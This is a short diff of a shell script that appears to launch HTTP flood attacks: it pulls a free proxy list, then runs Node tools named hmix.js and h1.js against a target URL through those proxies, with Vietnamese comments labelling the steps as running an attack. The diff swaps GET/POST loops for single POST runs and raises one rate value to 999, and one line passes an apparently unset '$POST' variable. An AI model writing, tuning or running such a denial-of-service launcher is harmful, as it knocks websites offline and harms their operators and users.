@@ -11,14 +11,11 @@ curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_prox
 
 export NODE_OPTIONS=--max-old-space-size=8192
 
-# Chạy tấn công với hmix.js
-for method in GET POST; do 
-  node hmix.js -m "$method" -u "$URL" -s "$TIME" -p live.txt -t 1 -r 48 --full true -d false &
-done
+node hmix.js -m POST -u "$URL" -s "$TIME" -p live.txt --full true -d false &
 
-# Chạy tấn công với h1.js
-for method in GET POST; do 
-  node h1.js "$method" "$URL" live.txt "$TIME" 48 10 randomstring=true &
-done
+node h1.js "$POST" "$URL" live.txt "$TIME" 999 10 randomstring="true" &
+
+
+
 wait
 pkill -f "hmix.js|h1.js|h1h2.js|http2.js|h1version.js|killer.js"
